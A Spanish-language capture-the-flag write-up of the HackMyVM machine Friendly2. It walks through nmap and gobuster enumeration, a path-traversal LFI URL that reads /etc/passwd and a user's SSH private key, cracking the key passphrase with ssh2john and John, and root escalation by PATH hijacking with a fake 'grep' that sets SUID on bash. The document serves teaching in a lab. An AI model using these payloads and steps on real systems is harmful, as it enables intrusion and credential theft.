# Máquina Friendly2 - HackMyVM

**Plataforma:** [Máquina Friendly2](https://hackmyvm.eu/machines/machine.php?vm=Friendly2)  
**Dificultad:** Facil  
**SO:** Linux (Debian)  
**Técnicas:** Local File Inclusion (LFI), Path Traversal, SSH Cracking (John the Ripper), Path Hijacking.

## Índice

1.  [Reconocimiento y Escaneo](https://www.google.com/search?q=%231-reconocimiento-y-escaneo)
2.  [Enumeración Web y Fuzzing](https://www.google.com/search?q=%232-enumeraci%C3%B3n-web-y-fuzzing)
3.  [Explotación: Local File Inclusion (LFI)](https://www.google.com/search?q=%233-explotaci%C3%B3n-local-file-inclusion-lfi)
4.  [Cracking de Clave SSH](https://www.google.com/search?q=%234-cracking-de-clave-ssh)
5.  [Escalada de Privilegios: Path Hijacking](https://www.google.com/search?q=%235-escalada-de-privilegios-path-hijacking)
6.  [Flag de Root y Post-Explotación](https://www.google.com/search?q=%236-flag-de-root-y-post-explotaci%C3%B3n)

## 1. Reconocimiento y Escaneo

### Descubrimiento de Hosts

Iniciamos identificando la IP de la víctima en la red local mediante un escaneo ARP:

```bash
┌──(root㉿kali)-[~]
└─# arp-scan -I eth0 192.168.100.0/24
Interface: eth0, type: EN10MB, MAC: 08:00:27:8a:35:d2, IPv4: 192.168.100.250
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.1   52:54:00:12:35:00       QEMU
192.168.100.2   52:54:00:12:35:00       QEMU
192.168.100.3   08:00:27:fa:0c:f9       PCS Systemtechnik GmbH
192.168.100.9   08:00:27:0c:8f:a4       PCS Systemtechnik GmbH

27 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 3.372 seconds (75.92 hosts/sec). 4 responded
```

| IP | MAC Address | Fabricante |
| :--- | :--- | :--- |
| **192.168.100.9** | 08:00:27:0c:8f:a4 | Oracle VirtualBox |

### Escaneo de Puertos y Servicios

Realizamos un escaneo exhaustivo con `nmap` para detectar servicios y versiones:

```bash
┌──(root㉿kali)-[~]
└─# nmap -p- -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.100.9
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 74:fd:f1:a7:47:5b:ad:8e:8a:31:02:fe:44:28:9f:d2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzieRbxwfRD6zuOrOmgPocWFr6Ufu9oCqOlt/Da5dqgRIZwctsaB6P5+6aDoCtBvFAzQXZQSMmT4GmIWR7eZ/Obou3fBSMU4X8R+C/VLyx1wifxNHy5LZ0+6djQX5cl5qhBseWQX3XIqPt+4DzRILCiMZSm9J8dnC0KEe14a8vkSfgV7Zn7xGOaw9R+KldazraLdT3zlzVuvjZjItIBjnA9tBorwY2u/RgMX++HXD3uySm1qt8w+pFGI7WFd/ktfwp3RhcdKMEYmqWhjAO3L9A9arf2vDYL9y/t53XIs+FAOXzoBc2A5gxxVBe7sMsuQCSF0Jw0z5Qf11Zj9si//6WG2KfihR7rKLEIfgeGFGvnilw88HT6sZQGTew1VpfRFLgMZTPpAOwzxlqUYIRWEEvmPrW7DGqzuY+8NpJQpiOhdjhuiS0/SW6PfHVB/nsNs1pWWwo/q+HxyAAS3WjCrkd1xMf92KMs1yheQHKUGNxV/zVuTbt9puXnVhIZGzzhsE=
|   256 16:f0:de:51:09:ff:fc:08:a2:9a:69:a0:ad:42:a0:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFE+bBFz/3QsD9M4Nt6is2iJpFKhlUCSEqpUtATmeiN6jNBE245wbyIk7h3JqOxldcKyfhn7uysTo8NG4AqhPEA=
|   256 65:0e:ed:44:e2:3e:f0:e7:60:0c:75:93:63:95:20:56 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKxSz6doeuMiydUVbE7ZwrdP8GW46iJYY3JxJPcNuvnA
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Servicio de Mantenimiento de Ordenadores
MAC Address: 08:00:27:0C:8F:A4 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```

**Resultados destacados:**

  * **Puerto 22/tcp:** OpenSSH 8.4p1 Debian.
  * **Puerto 80/tcp:** Apache httpd 2.4.56. Título: *Servicio de Mantenimiento de Ordenadores*.

## 2. Enumeración Web y Fuzzing

Utilizamos `gobuster` para descubrir directorios ocultos en el servidor web:

```bash
┌──(root㉿kali)-[/tmp]
└─# gobuster dir -u http://192.168.100.9 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x html,php -t 200
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.9
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
tools                (Status: 301) [Size: 314] [--> http://192.168.100.9/tools/]
assets               (Status: 301) [Size: 315] [--> http://192.168.100.9/assets/]
index.html           (Status: 200) [Size: 2698]
server-status        (Status: 403) [Size: 278]
Progress: 622923 / 622923 (100.00%)
===============================================================
Finished
===============================================================
```

| Directorio | Estado | Descripción |
| :--- | :--- | :--- |
| `/tools/` | 301 | Directorio de herramientas internas |
| `/assets/` | 301 | Recursos estáticos (imágenes, etc.) |
| `index.html`| 200 | Página principal |

Gracias al fuzzing podemos ver que existen dos directorios de interés para nosotros si vemos el código de _*http://192.168.100.9/toosl/*_ vemos la siguiente información. Podemos ver un comentario que será la clave de la explotación.

```html
<!DOCTYPE html>
<html>

	<head>
		<meta charset="UTF-8">
		<title>Sistema de herramientas</title>
		<style>
			h1{text-align: center;}
		</style>
	</head>

	<body>
		<h1 text-align="center"> <img src="/assets/sirena.gif"> INFORMACIÓN PRIVADA <img src="/assets/sirena.gif"> </h1>
		<div>
			<p> Toda la información de esta página está catalogada con un nivel de confidencialidad 4, esta información no deberá ser envidada ni compartida a ningún agente externo a la empresa.
		</div>

		<div>
			<h2> To do: </h2>
			<ul>
				<li> Añadir imágenes a la web principal. </li>
				<li> Añadir tema oscuro </li>
				<li> Traducir la página al inglés / translate the page into English. 😉</li>
				<!-- Redimensionar la imagen en check_if_exist.php?doc=keyboard.html -->
			</ul>
		</div>
	</body>

</html>
```

## 3. Explotación: Local File Inclusion (LFI)

Si accedemos a _*http://192.168.100.9/toosl/check_if_exist.php?doc=keyboard*_ podemos en lugar de escribir _*keyboard*_ después del igual escribir otras rutas del sistema lo que nos permitirá aceder a _*/etc/passwd*_ y ver a los usuarios del sistema, de este modo localizamos al usuarios _*gh0st*_. Escribimos en el navegador _*http://192.168.100.9/tools/check_if_exist.php?doc=../../../../../etc/passwd*_ para ver la información de los usuarios. Este tipo de vulnerabilidades se conocen como **LFI** o **Local File Inclusion** ya que podemos acceder a ficheros de la máquina victima a los que no deberíamos tener acceso a través de la URL gracias a un parámetro vulnerable. El método empleado para acceder al fichero _*/etc/passwd*_ se conoce en Hacking Web como **Path Traversal**.

Una vez realizado esto podemos buscar en el directorio _*/home/gh0st/.ssh*_ el id_rsa para poder conectarnos por ssh ya que el servicio está corriendo en el puerto 22.

Usamos wget para almacenar el id_rsa en la máquina atacante.

```bash
┌──(root㉿kali)-[/tmp]
└─# wget http://192.168.100.9/tools/check_if_exist.php?doc=../../../../../home/gh0st/.ssh/id_rsa
--2026-04-15 05:36:50--  http://192.168.100.9/tools/check_if_exist.php?doc=../../../../../home/gh0st/.ssh/id_rsa
Conectando con 192.168.100.9:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 2655 (2,6K) [text/html]
Grabando a: «check_if_exist.php?doc=..%2F..%2F..%2F..%2F..%2Fhome%2Fgh0st%2F.ssh%2Fid_rsa»

check_if_exist.php?do 100%[=======================>]   2,59K  --.-KB/s    en 0s

2026-04-15 05:36:50 (239 MB/s) - «check_if_exist.php?doc=..%2F..%2F..%2F..%2F..%2Fhome%2Fgh0st%2F.ssh%2Fid_rsa» guardado [2655/2655]


┌──(root㉿kali)-[/tmp]
└─# ls
'check_if_exist.php?doc=..%2F..%2F..%2F..%2F..%2Fhome%2Fgh0st%2F.ssh%2Fid_rsa'
 systemd-private-a1b41d832ddd424aae2804321a6cb59f-colord.service-tqr6Sl
 systemd-private-a1b41d832ddd424aae2804321a6cb59f-haveged.service-TWCSpZ
 systemd-private-a1b41d832ddd424aae2804321a6cb59f-ModemManager.service-CUx0Q6
 systemd-private-a1b41d832ddd424aae2804321a6cb59f-pcscd.service-haAvIm
 systemd-private-a1b41d832ddd424aae2804321a6cb59f-polkit.service-OextBk
 systemd-private-a1b41d832ddd424aae2804321a6cb59f-systemd-logind.service-wPKhaY
 systemd-private-a1b41d832ddd424aae2804321a6cb59f-upower.service-U9s9Xp

┌──(root㉿kali)-[/tmp]
└─# mv check_if_exist.php\?doc=..%2F..%2F..%2F..%2F..%2Fhome%2Fgh0st%2F.ssh%2Fid_rsa gh0st_id_rsa
```

En este momento intentamos conectarnos por ssh del siguiente modo pero vemos que se nos pide el passphrase de la clave privada. Por lo que usamos hashcat para intentar obtener la clave.

```bash
┌──(root㉿kali)-[/tmp]
└─# chmod 600 gh0st_id_rsa

┌──(root㉿kali)-[/tmp]
└─# ssh -i gh0st_id_rsa gh0st@192.168.100.9
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'gh0st_id_rsa':
(gh0st@192.168.100.9) Password:
```

## 4. Cracking de Clave SSH

Para resolver este problema vamos hacer uso de una de las herramientas de la suite de **John de Ripper** (JRT), muy empleadas en el crackeo de contraseñas, en concreto nos camos a centrar en la herramienta _*ssh2john*_ para obtener el passphrase. Por otra parte, vamos a hacer uso del diccionario _*rockyou.txt*_ muy empleado en ciberseguridad.

La herramienta _*ssh2john*_ onbtiene el hash identificativo de la clave privada, posteriormente a través de fuerza bruta se consigue el passphrase. 

El proceso consiste en una traducción y extracción de metadatos criptográficos: 
1. Se decodifica el bloque Base64 de la clave privada (id_rsa) a su estado binario original para que su estructura sea legible.
2. El script ssh2john actúa como un parser que localiza y extrae exclusivamente los parámetros del "candado" (el algoritmo, la sal y las iteraciones), generando un hash estandarizado. 
3. John the Ripper utiliza ese hash como punto de comparación: toma cada palabra del diccionario rockyou.txt, le aplica la misma fórmula matemática y, si el resultado coincide con el hash extraído, significa que ha encontrado la passphrase correcta.

```bash
┌──(root㉿kali)-[/tmp]
└─# tar -xvzf /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz && wc rockyou.txt
rockyou.txt
 14344391  14442068 139921497 rockyou.txt
```

```bash
┌──(root㉿kali)-[/tmp]
└─# ssh2john gh0st_id_rsa > hash.txt

┌──(root㉿kali)-[/tmp]
└─# john --wordlist=./rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
celtic           (id_rsa)     
1g 0:00:00:06 DONE (2026-04-15 06:52) 0.1663g/s 42.59p/s 42.59c/s 42.59C/s tiffany..freedom
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

_*Nota*_: Si ya hicimos anteriormente este proceso puede ocurrir que ya haya una ocurrencia de la búsqueda y nos salga el siguiente mensaje por lo que podemos ver la información almacenada igualmente del siguiente modo.

```bash
┌──(root㉿kali)-[/tmp]
└─# ssh2john gh0st_id_rsa > hash.txt

┌──(root㉿kali)-[/tmp]
└─# john --wordlist=./rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)

┌──(root㉿kali)-[/tmp]
└─# john --show hash.txt
gh0st_id_rsa:celtic

1 password hash cracked, 0 left
```

En este momento podemos acceder por SSH con el usuario _*gh0st*_.

```bash
┌──(root㉿kali)-[/tmp]
└─# ssh -i gh0st_id_rsa gh0st@192.168.100.9
...
```

Llegados a este punto vamos a realizar la escalada de privilegios a root mediante una técnica conocida como **Path Hijacking**.

## 5. Escalada de Privilegios: Path Hijacking

Primero de todo vemos si existe algún fichero con permisos SETUID extraño.

```bash
gh0st@friendly2:~$ find / -perm 4000 2>/dev/null
```

Analizamos los privilegios de sudo del usuario `gh0st`:

```bash
gh0st@friendly2:~$ sudo -l
Matching Defaults entries for gh0st on friendly2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gh0st may run the following commands on friendly2:
    (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
```

```bash
gh0st@friendly2:~$ ls -l /opt/security.sh
-rwxr-xr-x 1 root root 561 Apr 29  2023 /opt/security.sh
```

```bash
gh0st@friendly2:~$ cat /opt/security.sh
#!/bin/bash

echo "Enter the string to encode:"
read string

# Validate that the string is no longer than 20 characters
if [[ ${#string} -gt 20 ]]; then
  echo "The string cannot be longer than 20 characters."
  exit 1
fi

# Validate that the string does not contain special characters
if echo "$string" | grep -q '[^[:alnum:] ]'; then
  echo "The string cannot contain special characters."
  exit 1
fi

sus1='A-Za-z'
sus2='N-ZA-Mn-za-m'

encoded_string=$(echo "$string" | tr $sus1 $sus2)

echo "Original string: $string"
echo "Encoded string: $encoded_string"
```

El script `/opt/security.sh` utiliza comandos como `grep` y `tr` sin rutas absolutas. Además, tenemos el permiso **SETENV**, lo que permite manipular la variable `$PATH`.

### Explotación del Path

Como el script llama a los binarios _*grep*_ y _*tr*_ de forma relativa podremos usar **Path Hijacking** o secuestro de rutas como técnica de escalada de privilegios que aprovecha una configuración insegura en la variable de entorno $PATH. Ocurre cuando un sistema o programa intenta ejecutar un binario utilizando una ruta relativa y el atacante tiene permisos de escritura en uno de los directorios que aparecen primero en el $PATH.

El atacante coloca un archivo malicioso con el mismo nombre que el comando legítimo en su directorio controlado. Al ejecutar el programa, el sistema recorre el $PATH, encuentra primero el binario falso y lo ejecuta con los privilegios del proceso original, permitiendo al atacante tomar el control.

Por otra parte, la variable _*SETENV*_ concede al usuario la capacidad de dictar el entorno de ejecución del comando privilegiado. En un escenario de escalada de privilegios, esto permite inyectar variables maliciosas que alteren el flujo de ejecución del script (como la ruta de librerías o ejecutables), permitiendo ejecutar código arbitrario como root.

Procedemos a la explotación de la vulnerabilidad.

```bash
gh0st@friendly2:~$ ls
user.txt

gh0st@friendly2:~$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash

gh0st@friendly2:~$ echo "chmod u+s /bin/bash" > grep && cat grep
chmod u+s /bin/bash

gh0st@friendly2:~$ chmod +x grep

gh0st@friendly2:~$ ls -l
total 8
-rwxr-xr-x 1 gh0st gh0st 20 Apr 15 03:19 grep
-r--r----- 1 gh0st root  33 Apr 27  2023 user.txt

gh0st@friendly2:~$ sudo PATH=$(pwd):$PATH /opt/security.sh
Enter the string to encode:
Hackeando
The string cannot contain special characters.

gh0st@friendly2:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash

gh0st@friendly2:~$ bash -p
bash-5.1# whoami
root

bash-5.1# cd /root

bash-5.1# ls
interfaces.sh  root.txt

bash-5.1# cat root.txt
Not yet! Try to find root.txt.


Hint: ...
```

```bash
bash-5.1# find / -name "..." 2>/dev/null
/...
bash-5.1# cd /...
bash-5.1# ls
ebbg.txt
bash-5.1# cat ebbg.txt
It's codified, look the cipher:

CODIGO

Hint: numbers are not codified
```

## 6. Flag de Root y Post-Explotación

En el directorio `/root` encontramos una pista que nos redirige a un directorio oculto: `/.../`.

```bash
cd /...
cat ebbg.txt
```

El contenido está cifrado. El nombre del archivo (`ebbg`) es el resultado de aplicar **ROT13** a la palabra `root`. Aplicamos el mismo cifrado al contenido para obtener la flag final:

```bash
bash-5.1# echo "CODIGO" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
CODIGO
```